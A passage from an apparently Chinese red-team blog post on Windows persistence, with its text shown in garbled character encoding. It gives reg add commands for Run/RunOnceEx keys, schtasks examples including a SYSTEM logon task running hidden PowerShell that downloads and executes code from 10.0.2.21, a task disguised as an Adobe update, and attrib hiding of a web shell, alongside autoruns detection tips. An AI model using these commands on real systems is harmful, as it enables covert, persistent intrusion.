<h3 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h3><p>å¦‚æœæœ‰è¿›ç¨‹ä½¿ç”¨äº†CreateProcessã€CreateProcessAsUserã€CreateProcessWithLoginWã€CreateProcessWithTokenWæˆ–WinExecå‡½æ•°ï¼Œé‚£ä¹ˆæ­¤è¿›ç¨‹ä¼šè·å–<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls</code>æ³¨å†Œè¡¨é¡¹ï¼Œæ­¤é¡¹ä¸‹çš„dlléƒ½ä¼šåŠ è½½åˆ°è¿›ç¨‹ã€‚</p>
<h2 id="å¸¸è§„ç³»ç»Ÿè‡ªå¯åŠ¨é¡¹"><a href="#å¸¸è§„ç³»ç»Ÿè‡ªå¯åŠ¨é¡¹" class="headerlink" title="å¸¸è§„ç³»ç»Ÿè‡ªå¯åŠ¨é¡¹"></a>å¸¸è§„ç³»ç»Ÿè‡ªå¯åŠ¨é¡¹</h2><h3 id="ç³»ç»Ÿè‡ªå¯åŠ¨ç›®å½•"><a href="#ç³»ç»Ÿè‡ªå¯åŠ¨ç›®å½•" class="headerlink" title="ç³»ç»Ÿè‡ªå¯åŠ¨ç›®å½•"></a>ç³»ç»Ÿè‡ªå¯åŠ¨ç›®å½•</h3><p>ç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹ï¼š<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code><br>ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹ï¼š<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
<h3 id="è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹"><a href="#è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹" class="headerlink" title="è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹"></a>è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"></span><br><span class="line"># æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬ï¼Œæœ‰äº›æ³¨å†Œè¡¨é¡¹å¯èƒ½æ²¡æœ‰ã€‚ä¾‹å¦‚win7ä¸Šæˆ‘åªå‘ç°äº†Runå’ŒRunOnceã€‚</span><br></pre></td></tr></table></figure>
<p>Runå’ŒRunOnceæ³¨å†Œè¡¨é¡¹åœ¨ç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶è¿è¡Œã€‚é”®åéšæ„ï¼Œé”®å€¼ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚å¦‚æœåœ¨è¿™ä¸¤ä¸ªå¯åŠ¨é¡¹ä¸‹æœ‰å¤šä¸ªç¨‹åºï¼Œåˆ™è¿™äº›ç¨‹åºçš„è¿è¡Œé¡ºåºå¹¶ä¸ç¡®å®šã€‚<br>Runé¡¹çš„å€¼ä¼šä¸€ç›´å­˜åœ¨ï¼Œé™¤éç”¨æˆ·ä¸»åŠ¨åˆ é™¤ã€‚RunOnceä¼šåœ¨ä¸‹ä¸€æ¬¡é‡å¯æ—¶ï¼Œè¿è¡ŒæŒ‡å®šé”®å€¼çš„ç¨‹åºä¹‹å‰è‡ªåŠ¨åˆ é™¤ï¼Œå³è¯¥é”®å€¼ä¸‹çš„ç¨‹åºåªåœ¨ä¸‹ä¸€æ¬¡é‡å¯æ—¶å¯åŠ¨ä¸€æ¬¡ã€‚<br>RunServiceså’ŒRunServicesOnceæ³¨å†Œè¡¨é¡¹åœ¨ç™»é™†ä¼šè¯æ¡†ç¬¬ä¸€æ¬¡å‡ºç°æ—¶åœ¨åå°è¿è¡Œï¼Œæˆ–è€…åœ¨booté˜¶æ®µè¿è¡Œ(å¦‚æœæ²¡æœ‰ç™»é™†è¿‡ç¨‹)ã€‚<br>å¦‚æœå·²ææƒï¼Œæœ€å¥½ä½¿ç”¨HKEY_LOCAL_MACHINEï¼Œè€Œä¸æ˜¯HKEY_CURRENT_USERï¼Œè¿™æ ·å°†åœ¨æ¯æ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œï¼Œä¸éªŒè¯çš„ç”¨æˆ·èº«ä»½æ— å…³ã€‚<br>å‘½ä»¤æ¨¡æ¿ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>

<p>OddvarMoeå¤§ä½¬å‘ç°çš„å¦ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹ä½ç½®ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€ç¨‹åºæˆ–DLLï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.dll&quot;</span><br></pre></td></tr></table></figure>
<p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šåˆ«çš„è‡ªå¯åŠ¨é¡¹ï¼š<a href="https://zijieke.com/d/168">å¼€æœºè‡ªå¯æ³¨å†Œè¡¨ä½ç½®æ•´ç†</a></p>
<p>æˆ–è€…ä¸ºäº†å…æ€è¿˜å¯ä»¥å°†è¿è¡Œè„šæœ¬å’ŒåŠ å¯†payloadåˆ†å¼€å­˜å‚¨åˆ°ä¸åŒæ³¨å†Œè¡¨é¡¹ã€‚Empireçš„Persistence Registry Moduleå°±æ˜¯è¿™æ ·åšçš„ã€‚</p>
<h3 id="æ’æŸ¥-8"><a href="#æ’æŸ¥-8" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>å·¥å…·ï¼šautoruns</p>
<h2 id="ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡"><a href="#ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡" class="headerlink" title="ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡"></a>ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡</h2><h3 id="at-win-xp-2003"><a href="#at-win-xp-2003" class="headerlink" title="at[win xp/2003-]"></a>at[win xp/2003-]</h3><p>ç¤ºä¾‹ï¼Œè®¡åˆ’æ¯ä¸ªSaturdayå‡Œæ™¨1:00ç‚¹è¿è¡Œä¸€æ¬¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at 1:00 &#x2F;Every:Saturday MyDoor.bat </span><br></pre></td></tr></table></figure>
<p>å‚æ•°è§£æï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1:00        # æŒ‡å®šä»»åŠ¡è¿è¡Œæ—¶é—´ï¼Œ24å°æ—¶åˆ¶ã€‚</span><br><span class="line">&#x2F;every      # å°†ä»»åŠ¡å®‰æ’ä¸ºåœ¨æŒ‡å®šçš„ä¸€å¤©æˆ–ä¸€å‘¨çš„æŸä¸€å¤©æˆ–ä¸€ä¸ªæœˆçš„æŸä¸€å¤©è¿è¡Œ</span><br><span class="line">MyDoor.bat  # æŒ‡å®šå‘½ä»¤ã€ç¨‹åº(.exeæˆ–.com)æˆ–æ‰¹å¤„ç†ç¨‹åº(.batæˆ–.cmdæ–‡ä»¶)ã€‚ </span><br></pre></td></tr></table></figure>

<h3 id="schtasks-win7-2008"><a href="#schtasks-win7-2008" class="headerlink" title="schtasks[win7/2008+]"></a>schtasks[win7/2008+]</h3><p>æ‰€éœ€æƒé™ï¼šAdministrators</p>
<p>ç¤ºä¾‹1ï¼Œè®¡åˆ’æ¯å¤©å‡Œæ™¨8:00è¿è¡Œä¸€æ¬¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SCHTASKS &#x2F;Create &#x2F;RU &quot;SYSTEM&quot; &#x2F;tn &quot;AdobeReaderUpdate&quot; &#x2F;sc daily &#x2F;st 08:00 &#x2F;tr &quot;powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1&quot;</span><br></pre></td></tr></table></figure>
<p>å‚æ•°è§£æï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;RU     # ç”¨æŒ‡å®šç”¨æˆ·å¸æˆ·çš„æƒé™è¿è¡Œä»»åŠ¡ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨æœ¬åœ°è®¡ç®—æœºçš„å½“å‰ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚</span><br><span class="line">&#x2F;tn     # æŒ‡å®šä»»åŠ¡çš„åç§°ï¼Œç³»ç»Ÿä¸Šçš„æ¯é¡¹ä»»åŠ¡éƒ½å¿…é¡»å…·æœ‰å”¯ä¸€çš„åç§°ã€‚</span><br><span class="line">&#x2F;sc     # æŒ‡å®šè®¡åˆ’çš„è¿è¡Œé¢‘ç‡</span><br><span class="line">&#x2F;tr     # æŒ‡å®šä»»åŠ¡è¿è¡Œçš„ç¨‹åºæˆ–å‘½ä»¤ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬æ–‡ä»¶æˆ–æ‰¹å¤„ç†æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚å¦‚æœæœªæ·»åŠ è·¯å¾„ï¼Œåˆ™é»˜è®¤è¯¥æ–‡ä»¶ä½äº&lt;systemroot&gt;\System32ç›®å½•ä¸‹ã€‚</span><br></pre></td></tr></table></figure>

<p>ç¤ºä¾‹2ï¼Œæ¯å½“ä»»ä½•ç”¨æˆ·ç™»å½•æ—¶ä»»åŠ¡éƒ½å°†è¿è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn PentestLab &#x2F;tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;ZPWLywg&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onlogon &#x2F;ru System</span><br></pre></td></tr></table></figure>

<h3 id="æ’æŸ¥-9"><a href="#æ’æŸ¥-9" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>å·¥å…·ï¼šautoruns</p>
<h2 id="msfé»˜è®¤å†…ç½®è‡ªåŠ¨åŒ–ç»´æŒåŠŸèƒ½"><a href="#msfé»˜è®¤å†…ç½®è‡ªåŠ¨åŒ–ç»´æŒåŠŸèƒ½" class="headerlink" title="msfé»˜è®¤å†…ç½®è‡ªåŠ¨åŒ–ç»´æŒåŠŸèƒ½"></a>msfé»˜è®¤å†…ç½®è‡ªåŠ¨åŒ–ç»´æŒåŠŸèƒ½</h2><p>ç”±äºæ€è½¯ï¼Œè¿™æ ·ç›´æ¥ç”¨åŸºæœ¬æ²¡å®é™…æ„ä¹‰</p>
<h2 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h2><h3 id="attribå‘½ä»¤"><a href="#attribå‘½ä»¤" class="headerlink" title="attribå‘½ä»¤"></a>attribå‘½ä»¤</h3><p>attribå‘½ä»¤æ˜¯Windowsç³»ç»Ÿè‡ªå¸¦çš„ï¼Œç”¨æ¥æ˜¾ç¤ºæˆ–æ›´æ”¹æ–‡ä»¶å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">attrib +s +h myshell.php</span><br></pre></td></tr></table></figure>

<h4 id="æ’æŸ¥-10"><a href="#æ’æŸ¥-10" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>attribå‘½ä»¤æˆ–æ‰«æå·¥å…·ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>[1].<a href="https://mp.weixin.qq.com/s/3Zi404RkP5zvnFkth-IcYQ">æƒé™ç»´æŒä¹‹æ‰“é€ ä¸ä¸€æ ·çš„æ˜ åƒåŠ«æŒåé—¨</a><br>[2].<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">æ¸—é€æŠ€å·§â€”â€”Windowsç³»ç»Ÿçš„å¸æˆ·éšè—</a><br>[3].<a href="https://pentestlab.blog/methodologies/red-teaming/persistence/">Persistence_red-teaming_persistence</a><br>[4].<a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">ç¬¬2ç¯‡ï¼šWindowsæƒé™ç»´æŒâ€“åé—¨ç¯‡</a><br>[5].<a href="http://sh1yan.top/2019/06/29/Principle-and-Practice-of-COM-Component-Hijacking/">COMç»„ä»¶åŠ«æŒåŸç†ä¸å®è·µ</a><br>[6].<a href="http://blog.topsec.com.cn/attack%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/">ATT&amp;CKä¹‹åé—¨æŒä¹…åŒ–</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
</search>
